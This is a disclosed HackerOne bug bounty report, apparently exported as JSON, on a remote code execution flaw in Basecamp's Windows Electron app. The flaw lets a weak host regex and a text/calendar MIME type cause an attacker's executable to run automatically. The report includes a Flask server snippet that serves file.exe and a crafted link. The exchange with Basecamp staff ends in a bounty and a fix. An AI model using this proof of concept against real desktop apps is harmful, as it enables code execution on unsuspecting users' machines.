{"id":1016966,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDE2OTY2","url":"https://hackerone.com/reports/1016966","title":"Remote Code Execution in Basecamp Windows Electron App","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-10-23T11:30:45.327Z","submitted_at":"2020-10-23T11:30:45.346Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"co0sin","url":"/co0sin","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":67,"url":"https://hackerone.com/basecamp","handle":"basecamp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Basecamp","twitter_handle":"basecamp","website":"https://basecamp.com/about/policies/security/response","about":"Basecamp is the leading online project manager and the birthplace of Ruby on Rails."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-11-19T21:24:55.782Z","bug_reporter_agreed_on_going_public_at":"2020-11-19T21:24:55.709Z","team_member_agreed_on_going_public_at":"2020-11-19T18:23:25.324Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The Windows application for Basecamp, allows a \"Download\" feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.\n\nI was able to craft a link, which when clicked by a user, will be downloaded and executed! \n\nTo get file execution on the user, we bypass the restrictions first:\nThere is a regular expression which checks for \"internal domains\", which can easily be bypassed by controlling the subdomain. The host pattern is `/(launchpad\\.37signals\\.com|launchpad\\.(?:dev|test))/` and `/(3\\.(?:staging\\.)?basecamp\\.com|bc3\\.(?:dev|test))/`. By controlling the subdomain, and setting it to something like `launchpad.dev.mydomain.com`, we can bypass this regular expression verification.\n\nSince we'll be sending the request to our own server, we simply need to return `text/calendar` as the content-type header. This can be seen in the Electron code in `OPENABLE_MIME_TYPES = new Set([\"text/calendar\"]);`\nAnd then when adding the URL to your post, simply add the `?attachment=true` to the URL. \n\n\nTo reproduce, simply register any subdomain that starts with `launchpad.dev.` (mine is `launchpad.dev.████`).\nAn HTTP server with the needed mimetype header, can be setup with Flask easily with this code:\n```\nfrom flask import Flask, send_from_directory\napp = Flask(__name__)\n@app.route('/\u003cpath:path\u003e')\ndef hello(path):\n    return send_from_directory(\".\", \"file.exe\", as_attachment=True, mimetype=\"text/calendar\")\nif __name__ == '__main__':\n    app.run(port=80,host=\"0.0.0.0\")\n```\n\nThen add the link to your post with the appropriate `attachment` parameter, as such:\n`http://launchpad.dev.█████████/file.exe?attachment=true`\n\n## Impact\n\nRemote code execution on any user which clicks a link on your crafted post through the desktop app.","vulnerability_information_html":"\u003cp\u003eThe Windows application for Basecamp, allows a \u0026quot;Download\u0026quot; feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it\u0026#39;s a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.\u003c/p\u003e\n\n\u003cp\u003eI was able to craft a link, which when clicked by a user, will be downloaded and executed! \u003c/p\u003e\n\n\u003cp\u003eTo get file execution on the user, we bypass the restrictions first:\u003cbr\u003e\nThere is a regular expression which checks for \u0026quot;internal domains\u0026quot;, which can easily be bypassed by controlling the subdomain. The host pattern is \u003ccode\u003e/(launchpad\\.37signals\\.com|launchpad\\.(?:dev|test))/\u003c/code\u003e and \u003ccode\u003e/(3\\.(?:staging\\.)?basecamp\\.com|bc3\\.(?:dev|test))/\u003c/code\u003e. By controlling the subdomain, and setting it to something like \u003ccode\u003elaunchpad.dev.mydomain.com\u003c/code\u003e, we can bypass this regular expression verification.\u003c/p\u003e\n\n\u003cp\u003eSince we\u0026#39;ll be sending the request to our own server, we simply need to return \u003ccode\u003etext/calendar\u003c/code\u003e as the content-type header. This can be seen in the Electron code in \u003ccode\u003eOPENABLE_MIME_TYPES = new Set([\u0026quot;text/calendar\u0026quot;]);\u003c/code\u003e\u003cbr\u003e\nAnd then when adding the URL to your post, simply add the \u003ccode\u003e?attachment=true\u003c/code\u003e to the URL. \u003c/p\u003e\n\n\u003cp\u003eTo reproduce, simply register any subdomain that starts with \u003ccode\u003elaunchpad.dev.\u003c/code\u003e (mine is \u003ccode\u003elaunchpad.dev.████\u003c/code\u003e).\u003cbr\u003e\nAn HTTP server with the needed mimetype header, can be setup with Flask easily with this code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003efrom flask import Flask, send_from_directory\napp = Flask(__name__)\n@app.route(\u0026#39;/\u0026lt;path:path\u0026gt;\u0026#39;)\ndef hello(path):\n    return send_from_directory(\u0026quot;.\u0026quot;, \u0026quot;file.exe\u0026quot;, as_attachment=True, mimetype=\u0026quot;text/calendar\u0026quot;)\nif __name__ == \u0026#39;__main__\u0026#39;:\n    app.run(port=80,host=\u0026quot;0.0.0.0\u0026quot;)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThen add the link to your post with the appropriate \u003ccode\u003eattachment\u003c/code\u003e parameter, as such:\u003cbr\u003e\n\u003ccode\u003ehttp://launchpad.dev.█████████/file.exe?attachment=true\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eRemote code execution on any user which clicks a link on your crafted post through the desktop app.\u003c/p\u003e\n","bounty_amount":"1250.0","formatted_bounty":"$1,250","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-12-19T18:23:25.448Z","allow_singular_disclosure_after":-812902.824687406,"singular_disclosure_allowed":true,"vote_count":42,"voters":["daviey","carbon61","mashoud1122","mik317","kapkan","0xelkomy","mygf","cr33pb0y","bhavi","naategh","and 32 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":{"databaseId":4657,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"basecamp3.exe","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":9611709,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"markdown_message":"","automated_response":false,"created_at":"2020-10-23T11:39:08.834Z","updated_at":"2020-10-23T11:39:08.834Z","additional_data":{"old_severity":null,"new_severity":"Critical","old_severity_id":null,"new_severity_id":886445},"actor":{"username":"co0sin","cleared":false,"url":"/co0sin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9611754,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Demo:\n██████","markdown_message":"\u003cp\u003eDemo:\u003cbr\u003e\n██████\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-23T11:45:51.091Z","updated_at":"2020-11-19T19:38:15.664Z","actor":{"username":"co0sin","cleared":false,"url":"/co0sin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9618430,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"markdown_message":"","automated_response":false,"created_at":"2020-10-23T19:14:40.953Z","updated_at":"2020-10-23T19:14:40.953Z","additional_data":{"old_severity":"Critical","new_severity":"Medium","old_severity_id":886445,"new_severity_id":886790},"actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9618786,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for the report! We’re triaging as medium-severity and awarding a bounty on the high end of the medium tier because exploiting requires the attacker and victim to be on a Basecamp account together.\n\nWe’ll get this fixed soon.","markdown_message":"\u003cp\u003eThanks for the report! We’re triaging as medium-severity and awarding a bounty on the high end of the medium tier because exploiting requires the attacker and victim to be on a Basecamp account together.\u003c/p\u003e\n\n\u003cp\u003eWe’ll get this fixed soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-23T19:47:30.853Z","updated_at":"2020-10-23T19:48:20.735Z","actor":{"url":"/basecamp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Basecamp"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"basecamp","collaborator":{"username":"co0sin","url":"/co0sin"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9618797,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-23T19:47:47.939Z","updated_at":"2020-10-23T19:47:47.939Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9618845,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @georgeclaghorn, I'm pretty sure you don't need both the attacker and the victim on an account together. Can you not read someone else's post or comment through the desktop application? This should also work in the comments section, as any URL embedded in the page would work. ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/georgeclaghorn\"\u003e@georgeclaghorn\u003c/a\u003e, I\u0026#39;m pretty sure you don\u0026#39;t need both the attacker and the victim on an account together. Can you not read someone else\u0026#39;s post or comment through the desktop application? This should also work in the comments section, as any URL embedded in the page would work. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-23T19:50:30.800Z","updated_at":"2020-10-23T19:50:30.800Z","actor":{"username":"co0sin","cleared":false,"url":"/co0sin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9618947,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"”Account” in Basecamp refers to the shared top-level space, like a “team” in Slack or “organization” in GitHub. Accounts are separate from IDs used to log in.","markdown_message":"\u003cp\u003e”Account” in Basecamp refers to the shared top-level space, like a “team” in Slack or “organization” in GitHub. Accounts are separate from IDs used to log in.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-23T19:57:14.597Z","updated_at":"2020-10-23T20:05:59.289Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9619012,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That makes sense, thanks for the clarification. Thank you so much for the bounty!","markdown_message":"\u003cp\u003eThat makes sense, thanks for the clarification. Thank you so much for the bounty!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-23T20:00:55.921Z","updated_at":"2020-10-23T20:00:55.921Z","actor":{"username":"co0sin","cleared":false,"url":"/co0sin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9619532,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@georgeclaghorn I've looked into this further and might have found a way to make this exploitable towards other users + maybe another security issue.\n\nThis is what I've done, let me know if you can reproduce:\n1. I basically created another user, I added them to my basecamp and set them as an account owner in Adminland.\n2. After adding them, I could see them in the \"Pings\" menu, and sent them a message with my link.\n3. The user received an email that I've pinged them:\n██████\n4. The link in that ping email, \"respond in Basecamp\", **was identical to the invitation link:** `https://launchpad.37signals.com/4875300/invitations/f5f90ae955983d9d881063f170d56ad0?return_to=https%3A%2F%2F3.basecamp.com%2F4893488%2Fcircles%2F19350745`\n\nWhen I clicked the link that prompted me to respond, it was **like I accepted that invitation**. To verify, I logged out and in through the Desktop app, and I was prompted to choose an account!\n\n██████\n\nTo be honest it does still require *some* user interaction (clicking the link to reply to the message via email), but if a user does that, then goes to the desktop app and clicks my link - RCE. And he didn't even actually mean to accept my invitation.","markdown_message":"\u003cp\u003e\u003ca href=\"/georgeclaghorn\"\u003e@georgeclaghorn\u003c/a\u003e I\u0026#39;ve looked into this further and might have found a way to make this exploitable towards other users + maybe another security issue.\u003c/p\u003e\n\n\u003cp\u003eThis is what I\u0026#39;ve done, let me know if you can reproduce:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eI basically created another user, I added them to my basecamp and set them as an account owner in Adminland.\u003c/li\u003e\n\u003cli\u003eAfter adding them, I could see them in the \u0026quot;Pings\u0026quot; menu, and sent them a message with my link.\u003c/li\u003e\n\u003cli\u003eThe user received an email that I\u0026#39;ve pinged them:\n██████\u003c/li\u003e\n\u003cli\u003eThe link in that ping email, \u0026quot;respond in Basecamp\u0026quot;, \u003cstrong\u003ewas identical to the invitation link:\u003c/strong\u003e \u003ccode\u003ehttps://launchpad.37signals.com/4875300/invitations/f5f90ae955983d9d881063f170d56ad0?return_to=https%3A%2F%2F3.basecamp.com%2F4893488%2Fcircles%2F19350745\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eWhen I clicked the link that prompted me to respond, it was \u003cstrong\u003elike I accepted that invitation\u003c/strong\u003e. To verify, I logged out and in through the Desktop app, and I was prompted to choose an account!\u003c/p\u003e\n\n\u003cp\u003e██████\u003c/p\u003e\n\n\u003cp\u003eTo be honest it does still require \u003cem\u003esome\u003c/em\u003e user interaction (clicking the link to reply to the message via email), but if a user does that, then goes to the desktop app and clicks my link - RCE. And he didn\u0026#39;t even actually mean to accept my invitation.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-23T20:51:40.668Z","updated_at":"2020-11-19T19:37:31.850Z","actor":{"username":"co0sin","cleared":false,"url":"/co0sin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9637479,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @co0sin,\n\nThe desktop app team said, “First of all, kudos! This is a super clever exploit.”\n\nWe’ve prepared a test build with a fix [here](https://bc3-desktop.s3.amazonaws.com/builds/289e268/windows/basecamp3setup.exe) (SHA256 checksum: `efd10e63309978480e5ab07d0131a54a367e00eea69bb10455f7382d241419e9`). Would you mind verifying that this issue is fixed?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/co0sin\"\u003e@co0sin\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe desktop app team said, “First of all, kudos! This is a super clever exploit.”\u003c/p\u003e\n\n\u003cp\u003eWe’ve prepared a test build with a fix \u003ca href=\"/redirect?url=https%3A%2F%2Fbc3-desktop.s3.amazonaws.com%2Fbuilds%2F289e268%2Fwindows%2Fbasecamp3setup.exe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (SHA256 checksum: \u003ccode\u003eefd10e63309978480e5ab07d0131a54a367e00eea69bb10455f7382d241419e9\u003c/code\u003e). Would you mind verifying that this issue is fixed?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-26T15:07:38.165Z","updated_at":"2020-10-26T15:07:38.165Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9637588,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"markdown_message":"","automated_response":false,"created_at":"2020-10-26T15:14:39.992Z","updated_at":"2020-10-26T15:14:39.992Z","additional_data":{"old_severity":"Medium","new_severity":"High","old_severity_id":886790,"new_severity_id":888615},"actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9637603,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"\u003e  I've looked into this further and might have found a way to make this exploitable towards other users + maybe another security issue.\n\nThanks for sharing! We agree that this increases the severity of this issue. We’re awarding an additional $500 accordingly.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eI\u0026#39;ve looked into this further and might have found a way to make this exploitable towards other users + maybe another security issue.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThanks for sharing! We agree that this increases the severity of this issue. We’re awarding an additional $500 accordingly.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-26T15:15:50.843Z","updated_at":"2020-10-26T15:15:50.843Z","actor":{"url":"/basecamp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Basecamp"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"basecamp","collaborator":{"username":"co0sin","url":"/co0sin"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9638698,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the additional bounty!\nI just did a sweep, regular expression looks fine now. You should still note that the start of the host is not enforced. So things like `random.3.basecamp.com` will still pass. It's not really an issue but could open more attack surface for future open redirects.\n\nAnd you have a typo @ `INTERNAL_BLOB_PATH_ATTERN` ;) ","markdown_message":"\u003cp\u003eThanks for the additional bounty!\u003cbr\u003e\nI just did a sweep, regular expression looks fine now. You should still note that the start of the host is not enforced. So things like \u003ccode\u003erandom.3.basecamp.com\u003c/code\u003e will still pass. It\u0026#39;s not really an issue but could open more attack surface for future open redirects.\u003c/p\u003e\n\n\u003cp\u003eAnd you have a typo @ \u003ccode\u003eINTERNAL_BLOB_PATH_ATTERN\u003c/code\u003e ;) \u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-26T16:49:05.893Z","updated_at":"2020-10-26T16:49:05.893Z","actor":{"username":"co0sin","cleared":false,"url":"/co0sin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9638778,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you! We’ll mark this as resolved and publish that new release shortly.","markdown_message":"\u003cp\u003eThank you! We’ll mark this as resolved and publish that new release shortly.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-26T16:57:18.112Z","updated_at":"2020-10-26T16:57:18.112Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"co0sin","url":"/co0sin"},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9871204,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-19T18:23:25.357Z","updated_at":"2020-11-19T18:23:25.357Z","first_to_agree":true,"actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9871244,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@georgeclaghorn Can we censor all images, videos, attachments and the domain I've used for the PoC?","markdown_message":"\u003cp\u003e\u003ca href=\"/georgeclaghorn\"\u003e@georgeclaghorn\u003c/a\u003e Can we censor all images, videos, attachments and the domain I\u0026#39;ve used for the PoC?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-19T18:29:38.425Z","updated_at":"2020-11-19T18:29:38.425Z","actor":{"username":"co0sin","cleared":false,"url":"/co0sin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9871800,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure. I think I’ve done that now, but please check.","markdown_message":"\u003cp\u003eSure. I think I’ve done that now, but please check.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-19T19:38:55.448Z","updated_at":"2020-11-19T19:38:55.448Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9872768,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-19T21:24:55.733Z","updated_at":"2020-11-19T21:24:55.733Z","actor":{"username":"co0sin","cleared":false,"url":"/co0sin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9872769,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-19T21:24:55.812Z","updated_at":"2020-11-19T21:24:55.812Z","actor":{"username":"co0sin","cleared":false,"url":"/co0sin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}